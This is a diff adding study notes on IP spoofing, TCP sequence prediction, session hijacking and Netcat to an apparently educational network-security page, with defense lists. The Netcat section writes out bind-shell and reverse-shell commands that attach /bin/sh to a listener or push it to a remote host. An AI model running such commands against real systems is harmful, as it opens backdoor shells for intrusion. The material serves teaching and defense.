@@ -171,6 +171,9 @@
       <p>When a host makes a connection request to the Internet, PIX stores the packet's state information (the stuff mentioned above). When a response comes back, PIX checks that the sequence number and source/destination information match what it's expecting. Honestly, nothing special, but I included it for the sake of completeness.</p>
       <p>What is special however is that PIX does a few things to improve security. PIX proxies the connection until the three-way TCP handshake is complete. If the handshake is not completed within a certain time, the connection is dropped. This way, only legitimate connections are allowed through the PIX.</p>
       <p>The other thing PIX does to improve security is to randomize the initial sequence number. So PIX stores the delta between the actual sequence number and PIX's randomized sequence number and replaces each packet's sequence number with the correct number so that the calculations are consistent.</p>
+      <div class="ln-box">
+        <p>"IP Address Spoofing Flavor 2: Predicting TCP Sequence Numbers to Attack UNIX r-Commands" goes over what happens when sequence numbers are not randomized.</p>
+      </div>
       <h6>UDP</h6>
       <p>Since there's no state information available to keep track of for UDP, ASA uses a timer to track UDP sessions. The timer is active as long as there is traffic. If there has been no traffic after a certain amount of time, the timer expires and no more traffic is allowed for that session.</p>
       <h5>Stateful Inspection of Traffic Using the ASA</h5>
@@ -765,6 +768,130 @@
         <li>use static (sticky) ARP tables</li>
         <li>detect if an interface is running in promiscuous mode</li>
       </ul>
+      <h3>IP Address Spoofing</h3>
+      <p>Spoofing is helpful for attackers who don't want attacks to be traced back to them. It is also necessary for some attacks to work. The attacker can establish connections with other machines by pretending to be a machine that the other machines trust.</p>
+      <div class="ln-box">
+        <p>In this section, I'll be using Target and State Farm to refer to two machines on the same LAN. Target because that will be the attacker's target, and State Farm because they're a good neighbor.</p>
+      </div>
+      <h4>IP Address Spoofing Flavor 1: Simple Spoofing—Simply Changing the IP Address</h4>
+      <p>An attacker can change their machine to have a different IP address or they could use a tool that generates packets with a specific IP address. It's an easy way hide the source of an attack, but it doesn't allow the attacker to have interactive sessions with Target because all of Target's responses will be sent to whatever IP address was used.</p>
+      <p>In particular, this makes spoofing against TCP difficult. Suppose the attacker tries to establish a TCP connection with Target by pretending to be State Farm. The attacker starts by sending a SYN to Target with State Farm's address as the source. When Target receives the SYN, it will send an ACK to State Farm. Upon receiving the ACK, State Farm will send a RESET to Target because State Farm never initiated a connection with Target.</p>
+      <div class="ln-box">
+        <p>Although, if the attacker is on the same LAN as Target and State Farm, then the attacker can poison State Farm's ARP cache so that State Farm doesn't send a RESET to Target. Then the attacker can sniff Target's response.</p>
+      </div>
+      <h4>IP Address Spoofing Flavor 2: Predicting TCP Sequence Numbers to Attack UNIX r-Commands</h4>
+      <div class="ln-box">
+        <p>UNIX <code>r-</code> commands are largely obsolete by now. Some <code>r-</code> commands are <code>rlogin</code>, <code>rsh</code>, and <code>rcp</code>. These commands work on a trust relationship. If the target trusts the source, then the commands can be executed from the source without needing to provide the target's password.</p>
+      </div>
+      <p>To prevent State Farm from responding with a RESET, the attacker can launch a DoS attack against State Farm so that State Farm is unable to receive or send packets. So that takes care of that problem.</p>
+      <p>But there's another problem. Since Target sent the ACK to State Farm, the attacker doesn't know what Target's initial sequence number is. (In order for Target to accept the attacker's SYN-ACK, the SYN-ACK's sequence number needs to be Target's initial sequence number `+1`.)</p>
+      <p>Before initiating the attack, the attacker can try to analyze how Target's initial sequence numbers change with time by repeatedly sending SYN packets to Target. Once the attacker gets an idea of what future initial sequence numbers will probably look like, the attacker can then start the attack.</p>
+      <div class="ln-box">
+        <p>Does predicting sequence numbers sound familiar? A similar attack for Web applications involved predicting session IDs to take over a user's session.</p>
+      </div>
+      <p>This time, when Target receives the SYN and sends an ACK to State Farm, State Farm won't receive the ACK and, therefore, won't send the RESET to Target. This allows the attacker to send a SYN-ACK to Target with the guessed sequence number. If it's correct, Target will establish the TCP connection with the attacker, thinking it's with State Farm.</p>
+      <p>There's still one more small problem. The attacker can send commands to Target, but Target will execute these commands and send the response over to State Farm, meaning that the attacker misses out on these responses. The attacker can get around this by forcing Target to trust the attacker. For example, the attacker can add their IP address to Target's <code>/etc/hosts.equiv</code> file.</p>
+      <h4>IP Address Spoofing Flavor 3: Spoofing with Source Routing</h4>
+      <p>Source routing is a feature that allows the source machine to specify the path it wants the packets to take through the network.</p>
+      <p>Using this, the attacker can specify a source route such that the attacker is included on that route. So the route could look something like</p>
+      <div class="ln-center">
+        <p>State Farm `rarr ... rarr` attacker `rarr ... rarr` Target</p>
+      </div>
+      <p>Note that just because the route specifies State Farm as the starting point doesn't mean the attacker has to first send packets to State Farm. The attacker can just inject packets into the network and any routers in between the attacker and Target will assume that these packets started from State Farm.</p>
+      <p>Responses are delivered on the same route in reverse order, so when Target sends its responses back to State Farm, the attacker will pick them up. The attacker won't forward the responses back to State Farm because if they did, State Farm would send a RESET to Target, terminating the TCP connection between the attacker and Target.</p>
+      <h4>IP Spoofing Defenses</h4>
+      <ul>
+        <li>make sure that initial sequence numbers generated by TCP stacks are unpredictable</li>
+        <li>avoid applications that use IP addresses for authentication purposes</li>
+        <li>use an antispoof filter
+          <ul>
+            <li>checks the source address and interface on which the packet arrived to make sure they make sense</li>
+          </ul>
+        </li>
+        <li>do not allow source-routed packets through network gateways</li>
+      </ul>
+      <h3>Session Hijacking</h3>
+      <p>The previous section assumed that State Farm did not have an active connection to Target. This section assumes that.</p>
+      <h4>Network-Based Session Hijacking</h4>
+      <p>Suppose State Farm has an established telnet connection to Target. Suppose the attacker is sitting somewhere on the network between State Farm and Target. Since it's telnet, the attacker can see all the traffic passing between State Farm and Target. Specifically, the attacker can monitor the TCP sequence numbers.</p>
+      <p>At any point, the attacker can decide to hijack State Farm's session by sending spoofed traffic to Target with the proper TCP sequence numbers. The traffic is spoofed with State Farm's IP address, so Target will respond, thinking it came from State Farm. And thus, the attacker has stolen the session from State Farm.</p>
+      <div class="ln-box">
+        <p>This only works with clear-text protocols, such as telnet.</p>
+      </div>
+      <p>Now that Target is communicating with the attacker, Target's sequence numbers will continue increasing in sync with the attacker's sequence numbers. This means that State Farm's sequence number is now out of sync with Target's sequence number. If State Farm sends something to Target, Target will respond with a higher sequence number than when they last communicated, confusing State Farm.</p>
+      <p>When a system receives a packet with a sequence number that is out of order, it resends its last ACK packet (because it thinks that the last ACK it sent got lost). So State Farm and Target will perpetually send each other ACK packets, causing an ACK storm. This back-and-forth ACK traffic consumes bandwidth, degrading network performance. One way to prevent an ACK storm is to prevent State Farm from responding with a DoS attack.</p>
+      <p>Another way to prevent an ACK storm is to poison the ARP caches of State Farm and Target. Basically,</p>
+      <div class="ln-center">
+        <img class="img-fluid ln-image-small" src="../pictures/security/arpspoof_ackstorm.png">
+      </div>
+      <div class="ln-box">
+        <p>The name makes it sound like it's a flood of ACK packets, but really, it's just a 1:1 ping-pong loop.</p>
+      </div>
+      <h4>Another Way: Host-Based Session Hijacking</h4>
+      <p>Network-based session hijacking is useful if the attacker doesn't have an account on State Farm or Target's machines. But if the attacker has root access to State Farm or Target's machines, then host-based session hijacking is possible.</p>
+      <p>With root access, the attacker can read from the machine's tty to see all the input and output (including passwords). The attacker can even inject their own input into the tty to execute commands.</p>
+      <div class="ln-box">
+        <p>A tty is a software tool used by command-line programs to capture input from the keyboard and to display output to the screen. Essentially,</p>
+        <div class="ln-center">
+          <p>user `obrace(rarr)^text(input)` terminal `obrace(rarr)^text(input)` tty `obrace(rarr)^text(input)` program</p>
+          <p>user `ubrace(larr)_text(output)` terminal `ubrace(larr)_text(output)` tty `ubrace(larr)_text(output)` program</p>
+        </div>
+      </div>
+      <h3>Netcat: A General-Purpose Network Tool</h3>
+      <p>Netcat is a tool for reading and writing data across a network.</p>
+      <div class="ln-box">
+        <p>It is similar to what the UNIX command <code>cat</code> does, where <code>cat</code> can read and write files. Just as <code>cat</code> moves bytes between stdin and stdout, Netcat (<code>nc</code>) moves bytes from one TCP/UDP port to another.</p>
+      </div>
+      <p>Netcat has a client mode and listen mode. Client mode allows Netcat to initiate a TCP/UDP connection to another machine. Listen mode (<code>-l</code> option) allows Netcat to open a TCP/UDP port to accept any incoming data.</p>
+      <div class="ln-box">
+        <p>If a machine doesn't have Netcat installed, the attacker can use a buffer overflow attack to install Netcat.</p>
+      </div>
+      <h4>Netcat for File Transfer</h4>
+      <p>An attacker can transfer a file using Netcat by either pushing it from client to listener or pulling it from listener back to client. Here is what pushing looks like:</p>
+      <div class="ln-center">
+        <img class="img-fluid ln-image-small" src="../pictures/security/netcat_filetransfer_push.png">
+      </div>
+      <p>And here is what pulling looks like:</p>
+      <div class="ln-center">
+        <img class="img-fluid ln-image-small" src="../pictures/security/netcat_filetransfer_pull.png">
+      </div>
+      <h4>Netcat for Port Scanning</h4>
+      <p>Netcat can be used for port scanning, but it only does TCP Connect scans (completing the three-way handshake).</p>
+      <h4>Netcat for Making Connections to Open Ports</h4>
+      <p>If there are any open ports, Netcat can connect to those ports and send data through. This allows the attacker to see how the service running on that port responds to certain input.</p>
+      <h4>Netcat for Vulnerability Scanning</h4>
+      <p>Not as good as Nessus, but still something.</p>
+      <h4>Using Netcat to Create a Passive Backdoor Command Shell</h4>
+      <p>The attacker can set up a Netcat listener on the victim machine and force it to start a command shell when someone connects.</p>
+      <div class="ln-center">
+        <p><code>nc -l -p [port] -e /bin/sh</code></p>
+      </div>
+      <p>Then when the attacker connects to the victim machine</p>
+      <div class="ln-center">
+        <p><code>nc [victim_machine] [port]</code></p>
+      </div>
+      <p>the attacker has access to the command shell on the victim machine.</p>
+      <p>However, this won't work if there is a firewall that blocks inbound connections.</p>
+      <h4>Using Netcat to Actively Push a Backdoor Command Shell</h4>
+      <p>To bypass the firewall, the attacker forces the victim to connect to the attacker's machine instead. First the attacker creates a listener on their machine:</p>
+      <div class="ln-center">
+        <p><code>nc -l -p [port]</code></p>
+      </div>
+      <p>Then the attacker runs Netcat in the victim machine to push a command shell out to the attacker:</p>
+      <div class="ln-center">
+        <p><code>nc [victim_machine] [port] -e /bin/sh</code></p>
+      </div>
+      <p>Pushing a shell via an outbound connection is called a reverse shell.</p>
+      <h4>Relaying Traffic with Netcat</h4>
+      <p>To make it harder for investigators to trace the attack back to the attacker, the attacker can set up relays. Basically, the attacker sets up many machines between them and the victim so that the relays relay the traffic. The result is chain of Netcat clients and listeners.</p>
+      <p>Additionally, if the attacker controls a machine in the DMZ, they can relay the traffic around a firewall through the DMZ.</p>
+      <h4>Netcat Defenses</h4>
+      <ul>
+        <li>limit incoming and outgoing traffic</li>
+        <li>close unused ports</li>
+        <li>apply latest security patches</li>
+        <li>conduct periodic port scans to look for strange, unexpected listening ports</li>
+      </ul>
       <div class="ln-box">
         <h3>Tools</h3>
         <ul>
@@ -772,7 +899,16 @@
           <li>Snort - network IDS that started as a sniffer</li>
           <li>Dsniff - active sniffer
             <ul>
-              <li>arpspoof, dnsspoof, webmitm</li>
+              <li>arpspoof, dnsspoof, webmitm, session hijacking</li>
+            </ul>
+          </li>
+          <li>Hunt - network-based session hijacking (obsolete)</li>
+          <li>Juggernaut - network-based session hijacking (obsolete)</li>
+          <li>TTYWatcher - host-based session hijacking (obsolete)</li>
+          <li>TTYSnoop - host-based session hijacking (obsolete)</li>
+          <li>Netcat - Swiss Army knife of network tools
+            <ul>
+              <li>file transfer, port scanning, vulnerability scanning, reverse shell</li>
             </ul>
           </li>
         </ul>
